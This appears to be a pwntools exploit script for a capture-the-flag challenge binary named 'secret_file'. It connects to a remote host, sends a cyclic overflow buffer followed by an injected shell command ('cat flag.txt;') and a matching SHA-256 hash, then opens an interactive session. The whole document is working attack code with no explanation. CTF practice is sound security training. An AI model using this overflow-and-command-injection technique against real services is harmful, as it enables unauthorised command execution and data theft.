from pwn import *
import hashlib
# encoding: utf-8
#p = process("./secret_file")
p = remote( "111.200.241.244",50739)

payload = cyclic(0x100)  # bytes
hash_code = hashlib.sha256(payload).hexdigest()
# payload = payload + b"ls;".ljust(0x1B, b"a") + hash_code.encode("ISO-8859-1")
payload = payload + b"cat flag.txt;".ljust(0x1B, b"a") + hash_code.encode("ISO-8859-1")
p.sendline(payload)
p.interactive()
